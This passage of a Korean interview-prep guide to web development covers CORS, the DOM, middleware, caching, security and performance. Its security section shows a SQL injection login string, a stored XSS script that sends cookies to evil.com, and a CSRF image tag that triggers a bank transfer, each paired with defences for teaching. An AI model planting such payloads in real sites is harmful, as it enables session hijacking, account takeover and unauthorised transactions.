<!-- JS는 파싱 차단 (DOM 구성 중단) -->
<script src="app.js"></script>

<!-- 해결: async 또는 defer 사용 -->
<script async src="analytics.js"></script>  <!-- 다운로드 중 파싱 계속, 실행 즉시 -->
<script defer src="app.js"></script>        <!-- 다운로드 중 파싱 계속, DOM 완성 후 실행 -->
```

| 속성 | 다운로드 | 실행 시점 | 실행 순서 |
|------|----------|-----------|-----------|
| 기본 | 차단 | 즉시 | 순서대로 |
| async | 비동기 | 다운로드 완료 시 | 순서 보장 안됨 |
| defer | 비동기 | DOMContentLoaded 전 | 순서대로 |

### CORS (Cross-Origin Resource Sharing) ◑

브라우저의 동일 출처 정책(Same-Origin Policy)을 우회하여 다른 출처의 리소스를 요청할 수 있게 하는 메커니즘이다.

#### 출처(Origin)란? ◑

```
https://www.example.com:443/path
└─┬─┘   └──────┬──────┘└┬┘
scheme       host     port

출처 = scheme + host + port
```

다음 두 URL은 같은 출처인가?

| URL 1 | URL 2 | 같은 출처? |
|-------|-------|-----------|
| `https://example.com` | `https://example.com/path` | O (path는 무관) |
| `https://example.com` | `http://example.com` | X (scheme 다름) |
| `https://example.com` | `https://api.example.com` | X (host 다름) |
| `https://example.com` | `https://example.com:8080` | X (port 다름) |

#### CORS 동작 방식 ◑

```
[Simple Request - 단순 요청]
GET, HEAD, POST + 특정 헤더만 사용하는 경우

클라이언트 (https://app.com)          서버 (https://api.com)
    |                                    |
    |--- GET /data ------------------->|
    |    Origin: https://app.com        |
    |                                    |
    |<-- 200 OK ----------------------|
    |    Access-Control-Allow-Origin:   |
    |    https://app.com                |


[Preflight Request - 사전 요청]
PUT, DELETE 또는 커스텀 헤더 사용 시

클라이언트                              서버
    |                                    |
    |--- OPTIONS /data --------------->|  (사전 요청)
    |    Origin: https://app.com        |
    |    Access-Control-Request-Method: |
    |    DELETE                         |
    |                                    |
    |<-- 204 No Content ---------------|  (허용 여부 응답)
    |    Access-Control-Allow-Origin:   |
    |    https://app.com                |
    |    Access-Control-Allow-Methods:  |
    |    GET, POST, DELETE              |
    |                                    |
    |--- DELETE /data ---------------->|  (실제 요청)
    |                                    |
```

주요 CORS 헤더:

| 헤더 | 설명 |
|------|------|
| `Access-Control-Allow-Origin` | 허용할 출처 (`*` 또는 특정 출처) |
| `Access-Control-Allow-Methods` | 허용할 HTTP 메서드 |
| `Access-Control-Allow-Headers` | 허용할 커스텀 헤더 |
| `Access-Control-Allow-Credentials` | 쿠키 포함 요청 허용 여부 |
| `Access-Control-Max-Age` | Preflight 결과 캐시 시간 |

#### CORS 에러 해결 방법 ◑

1. **서버에서 CORS 헤더 설정** (권장)
   ```javascript
   // Express.js
   app.use(cors({ origin: 'https://app.com' }));
   ```

2. **프록시 서버 사용** (개발 환경)
   ```javascript
   // Vite/Webpack 프록시 설정
   proxy: {
     '/api': 'https://api.com'
   }
   ```

3. **같은 출처로 배포** (Nginx 리버스 프록시)

---

## 8. 프론트엔드 개념 ◑

### DOM (Document Object Model) ◑

DOM은 HTML 문서를 트리 구조의 객체로 표현한 것이다. JavaScript가 HTML 요소에 접근하고 조작할 수 있게 해준다.

```html
<!-- HTML 문서 -->
<!DOCTYPE html>
<html>
  <head>
    <title>My Page</title>
  </head>
  <body>
    <div id="app">
      <h1>Hello</h1>
      <p>World</p>
    </div>
  </body>
</html>
```

```
[DOM 트리]
        Document
            │
          <html>
         /      \
     <head>    <body>
        │          │
    <title>     <div#app>
        │        /    \
    "My Page"  <h1>   <p>
                │      │
            "Hello" "World"
```

DOM 조작의 문제점: 직접 DOM을 변경하면 브라우저가 레이아웃 재계산과 리페인트를 수행해야 해서 성능이 저하된다. 특히 반복적인 DOM 조작은 매우 비효율적이다.

### Virtual DOM ◑

Virtual DOM은 실제 DOM의 메모리상 가벼운 복사본이다. React, Vue 등 현대 프레임워크에서 사용한다.

```
[Virtual DOM 동작 과정]

1. 상태 변경 발생
   state: { count: 0 } → { count: 1 }

2. 새로운 Virtual DOM 생성
   [새 Virtual DOM]
   <div>
     <span>Count: 1</span>
   </div>

3. 이전 Virtual DOM과 비교 (Diffing)
   [이전]              [새로운]
   <span>Count: 0</span>  →  <span>Count: 1</span>
                              ^^^^^^^^
                              변경된 부분!

4. 실제 DOM에 최소한의 변경만 적용 (Reconciliation)
   textContent: "0" → "1" (이것만 변경!)
```

Virtual DOM의 장점:
- 개발자는 "현재 상태에서 UI가 어떻게 보여야 하는가"만 선언
- 프레임워크가 효율적인 DOM 업데이트를 자동으로 처리
- 배치 업데이트로 불필요한 리렌더링 방지

### 이벤트 전파 ◑

DOM 이벤트는 세 단계로 전파된다.

```html
<div id="outer">
  <div id="inner">
    <button id="btn">Click</button>
  </div>
</div>
```

```
[이벤트 전파 단계]

       ┌─────────────────────────────────┐
       │           document              │
       │  ┌───────────────────────────┐  │
       │  │         #outer            │  │
       │  │  ┌─────────────────────┐  │  │
       │  │  │       #inner        │  │  │
       │  │  │  ┌───────────────┐  │  │  │
       │  │  │  │     #btn      │  │  │  │
       │  │  │  └───────────────┘  │  │  │
       │  │  └─────────────────────┘  │  │
       │  └───────────────────────────┘  │
       └─────────────────────────────────┘

1. Capturing (캡처링): document → #outer → #inner → #btn (하향)
2. Target: #btn에서 이벤트 처리
3. Bubbling (버블링): #btn → #inner → #outer → document (상향)
```

```javascript
// 버블링 단계에서 처리 (기본값)
element.addEventListener('click', handler);

// 캡처링 단계에서 처리
element.addEventListener('click', handler, true);

// 전파 중단
event.stopPropagation();
```

#### 이벤트 위임 (Event Delegation) ◑

자식 요소의 이벤트를 부모에서 처리하는 패턴이다.

```html
<ul id="list">
  <li>Item 1</li>
  <li>Item 2</li>
  <li>Item 3</li>
  <!-- 나중에 추가될 수도 있음 -->
</ul>
```

```javascript
// 나쁜 예: 각 li에 이벤트 핸들러 등록
document.querySelectorAll('li').forEach(li => {
  li.addEventListener('click', handler);
});
// 문제: 새로 추가된 li는 핸들러가 없음

// 좋은 예: 부모에 위임
document.getElementById('list').addEventListener('click', (e) => {
  if (e.target.tagName === 'LI') {
    console.log('클릭된 항목:', e.target.textContent);
  }
});
// 장점: 새로 추가된 li도 자동으로 처리됨
```

---

## 9. 백엔드 개념 ◑

### 웹 서버 vs WAS ◑

| 구분 | 웹 서버 (Web Server) | WAS (Web Application Server) |
|------|---------------------|------------------------------|
| 역할 | 정적 콘텐츠 제공 | 동적 콘텐츠 처리 |
| 콘텐츠 | HTML, CSS, JS, 이미지 | 비즈니스 로직 실행 결과 |
| 예시 | Nginx, Apache HTTP Server | Tomcat, Node.js, Django |
| 특징 | 빠름, 단순 | 유연함, 복잡 |

일반적인 아키텍처:

```
클라이언트 → [Nginx] → [Node.js/Tomcat] → [DB]
              웹 서버        WAS
            (정적 파일,   (비즈니스 로직,
            리버스 프록시,  DB 연동)
            로드 밸런싱)
```

Nginx가 앞에 위치하는 이유:
1. **정적 파일 서빙**: WAS보다 빠름
2. **SSL 종료**: HTTPS 처리를 Nginx에서 담당
3. **로드 밸런싱**: 여러 WAS 인스턴스에 분산
4. **캐싱**: 응답 캐시로 WAS 부하 감소
5. **보안**: WAS를 외부에 직접 노출하지 않음

### 미들웨어 ◑

미들웨어는 요청과 응답 사이에서 공통 처리를 담당하는 함수다.

```
요청 → [미들웨어1] → [미들웨어2] → [미들웨어3] → 라우트 핸들러
                                                    │
응답 ← [미들웨어1] ← [미들웨어2] ← [미들웨어3] ←───┘
```

```javascript
// Express.js 미들웨어 예시
const express = require('express');
const app = express();

// 로깅 미들웨어
app.use((req, res, next) => {
  console.log(`${req.method} ${req.url}`);
  next();  // 다음 미들웨어로 전달
});

// 인증 미들웨어
app.use('/api', (req, res, next) => {
  if (!req.headers.authorization) {
    return res.status(401).json({ error: '인증 필요' });
  }
  next();
});

// 에러 핸들링 미들웨어 (4개의 인자)
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({ error: '서버 오류' });
});
```

일반적인 미들웨어 종류:
- **로깅**: 요청/응답 기록 (morgan)
- **인증/인가**: JWT 검증, 세션 확인
- **파싱**: JSON, form-data 파싱 (body-parser)
- **CORS**: Cross-Origin 허용
- **압축**: gzip 압축 (compression)
- **Rate Limiting**: 요청 속도 제한
- **에러 핸들링**: 예외 처리

### 캐싱 전략 ◑

캐싱은 응답 속도 향상과 서버 부하 감소를 위해 필수적이다.

| 위치 | 설명 | 예시 |
|------|------|------|
| **브라우저 캐시** | 클라이언트 로컬 저장 | Cache-Control, ETag |
| **CDN 캐시** | 엣지 서버에 캐시 | CloudFront, Cloudflare |
| **애플리케이션 캐시** | 서버 메모리/Redis | Redis, Memcached |
| **DB 캐시** | 쿼리 결과 캐시 | Query Cache |

#### HTTP 캐싱 헤더 ◑

```
# Cache-Control: 캐시 정책 지정
Cache-Control: max-age=3600            # 1시간 캐시
Cache-Control: no-store                # 캐시 금지
Cache-Control: no-cache                # 매번 서버에 검증
Cache-Control: public, max-age=31536000  # CDN/브라우저 1년 캐시

# ETag: 리소스 버전 식별
ETag: "abc123"

# If-None-Match: 조건부 요청
If-None-Match: "abc123"  →  304 Not Modified (변경 없으면)
```

캐싱 전략 예시:

| 리소스 | 캐시 전략 |
|--------|----------|
| HTML | no-cache (매번 검증) |
| CSS/JS (해시 포함) | 1년 캐시 (immutable) |
| API 응답 | 상황에 따라 (private, max-age=60) |
| 사용자 데이터 | no-store (캐시 금지) |

---

## 10. 웹 보안

### OWASP Top 10 (주요) ◑

#### SQL Injection ◑

사용자 입력에 SQL 코드를 삽입하여 데이터베이스를 조작하는 공격이다.

```
[공격 시나리오]
로그인 폼에서:
  아이디: admin' --
  비밀번호: (아무거나)

취약한 코드:
  query = "SELECT * FROM users WHERE id='" + userId + "' AND pw='" + password + "'"

실행되는 SQL:
  SELECT * FROM users WHERE id='admin' --' AND pw='xxx'
                           └────────┘ └─────────────────┘
                           admin으로   주석 처리되어 무시됨
                           로그인 성공!
```

대응:
- **Prepared Statement / Parameterized Query 사용** (필수)
- ORM 사용
- 입력값 검증

```javascript
// 취약한 코드 (절대 사용 금지)
db.query(`SELECT * FROM users WHERE id='${userId}'`);

// 안전한 코드
db.query('SELECT * FROM users WHERE id = ?', [userId]);
```

#### XSS (Cross-Site Scripting) ◑

웹 페이지에 악성 스크립트를 삽입하는 공격이다.

```
[Stored XSS 시나리오]
1. 공격자가 게시글 작성
   내용: <script>document.location='https://evil.com?cookie='+document.cookie</script>

2. 다른 사용자가 게시글 열람
   → 스크립트 실행
   → 쿠키가 공격자 서버로 전송

3. 공격자가 탈취한 세션 쿠키로 사용자 계정 탈취
```

XSS 유형:

| 유형 | 설명 |
|------|------|
| Stored XSS | 악성 스크립트가 DB에 저장되어 지속적으로 실행 |
| Reflected XSS | URL 파라미터 등을 통해 일회성으로 실행 |
| DOM-based XSS | 클라이언트 JavaScript에서 발생 |

대응:
- **출력 시 이스케이프** (`<` → `&lt;`)
- **HttpOnly 쿠키** (JavaScript에서 접근 불가)
- **CSP (Content-Security-Policy)** 헤더
- React/Vue 등 프레임워크 사용 (자동 이스케이프)

```javascript
// 취약한 코드
element.innerHTML = userInput;

// 안전한 코드 (React)
<div>{userInput}</div>  // 자동 이스케이프
```

#### CSRF (Cross-Site Request Forgery) ◑

사용자가 의도하지 않은 요청을 보내게 만드는 공격이다.

```
[공격 시나리오]
1. 사용자가 은행 사이트에 로그인 (세션 쿠키 보유)

2. 공격자가 만든 악성 페이지 방문
   <img src="https://bank.com/transfer?to=attacker&amount=1000000">

3. 브라우저가 이미지 로드 시도
   → 은행 서버에 GET 요청
   → 세션 쿠키 자동 첨부
   → 사용자 모르게 송금 실행!
```

대응:
- **CSRF 토큰** (서버가 발급한 일회성 토큰을 폼에 포함)
- **SameSite 쿠키** (`SameSite=Strict` 또는 `Lax`)
- **Referer 헤더 검증**
- 중요 작업은 GET 대신 POST 사용

```html
<!-- CSRF 토큰 사용 -->
<form method="POST" action="/transfer">
  <input type="hidden" name="_csrf" value="random-token-123">
  <input type="text" name="amount">
  <button type="submit">송금</button>
</form>
```

### 보안 헤더 ◑

| 헤더 | 설명 | 예시 |
|------|------|------|
| **Content-Security-Policy** | 허용된 리소스 출처 지정 | `default-src 'self'` |
| **X-Frame-Options** | iframe 삽입 방지 (클릭재킹 방어) | `DENY`, `SAMEORIGIN` |
| **X-Content-Type-Options** | MIME 타입 스니핑 방지 | `nosniff` |
| **Strict-Transport-Security** | HTTPS 강제 | `max-age=31536000` |
| **X-XSS-Protection** | 브라우저 XSS 필터 (구식) | `1; mode=block` |

---

## 11. 웹 성능 최적화 ◑

### 프론트엔드 최적화 ◑

| 기법 | 설명 | 효과 |
|------|------|------|
| **코드 분할** | 필요한 JS만 로드 (Lazy Loading) | 초기 로딩 시간 단축 |
| **트리 셰이킹** | 사용하지 않는 코드 제거 | 번들 크기 감소 |
| **이미지 최적화** | WebP 포맷, 지연 로딩, srcset | 대역폭 절약 |
| **번들 최소화** | Minification, 압축 (gzip/brotli) | 전송 크기 감소 |
| **CDN 활용** | 정적 자산을 엣지 서버에 배포 | 지연 시간 단축 |
| **프리로드/프리페치** | 필요한 리소스 미리 로드 | 체감 속도 향상 |

#### 이미지 최적화 예시 ◑

```html
<!-- 반응형 이미지 -->
<img srcset="small.jpg 300w,
             medium.jpg 600w,
             large.jpg 1200w"
     sizes="(max-width: 600px) 300px,
            (max-width: 1200px) 600px,
            1200px"
     src="medium.jpg"
     alt="Example"
     loading="lazy">  <!-- 지연 로딩 -->

<!-- 최신 포맷 우선 사용 -->
<picture>
  <source type="image/avif" srcset="image.avif">
  <source type="image/webp" srcset="image.webp">
  <img src="image.jpg" alt="Example">
</picture>
```

#### 코드 분할 예시 ◑

```javascript
// React에서 동적 import (Code Splitting)
import React, { lazy, Suspense } from 'react';

const HeavyComponent = lazy(() => import('./HeavyComponent'));

function App() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <HeavyComponent />
    </Suspense>
  );
}
```

### 핵심 성능 지표 (Core Web Vitals) ◑

Google이 정의한 사용자 경험 핵심 지표다.

| 지표 | 설명 | 좋음 | 개선 필요 |
|------|------|------|----------|
| **LCP** (Largest Contentful Paint) | 가장 큰 콘텐츠 렌더링 시간 | < 2.5s | > 4s |
| **INP** (Interaction to Next Paint) | 상호작용 응답 시간 | < 200ms | > 500ms |
| **CLS** (Cumulative Layout Shift) | 레이아웃 이동 누적 | < 0.1 | > 0.25 |

```
[LCP 개선 방법]
- 서버 응답 시간 단축
- 렌더링 차단 리소스 제거
- 이미지 최적화 및 프리로드
- SSR 또는 SSG 사용

[INP 개선 방법]
- 긴 JavaScript 작업 분할
- 불필요한 JavaScript 제거
- 서드파티 스크립트 최소화

[CLS 개선 방법]
- 이미지/동영상에 크기 명시
- 동적 콘텐츠 삽입 시 공간 예약
- 웹폰트 FOUT/FOIT 처리
```

### 측정 도구 ◑

| 도구 | 용도 |
|------|------|
| **Chrome DevTools** | 네트워크, 성능, Coverage 분석 |
| **Lighthouse** | 종합 점수 및 개선 제안 |
| **PageSpeed Insights** | 실제 사용자 데이터 포함 |
| **WebPageTest** | 상세한 워터폴 분석 |

---

## 면접 대비 체크리스트 ◑

- [ ] 쿠키, 세션, 토큰 (JWT)의 차이와 각각의 장단점
- [ ] HTTP 메서드의 안전성과 멱등성 차이
- [ ] GET vs POST 차이 (캐싱, 보안, 멱등성 관점)
- [ ] HTTP 상태 코드 (특히 401 vs 403 차이)
- [ ] CSR vs SSR 차이와 적합한 사용 사례
- [ ] REST API 설계 원칙과 좋은 URL 설계
- [ ] REST vs GraphQL 비교 (Over/Under-fetching 문제)
- [ ] 브라우저에 URL 입력 시 동작 과정 (DNS → TCP → TLS → HTTP → 렌더링)
- [ ] CORS의 개념과 동작 방식 (Simple/Preflight Request)
- [ ] XSS, CSRF, SQL Injection 공격과 방어 방법
- [ ] WebSocket과 HTTP의 차이, 언제 WebSocket을 사용하는가
- [ ] Virtual DOM의 동작 원리와 장점
- [ ] 이벤트 버블링과 캡처링, 이벤트 위임
- [ ] 브라우저 렌더링 과정 (DOM, CSSOM, 렌더 트리, 레이아웃, 페인트)
- [ ] Core Web Vitals (LCP, INP, CLS)
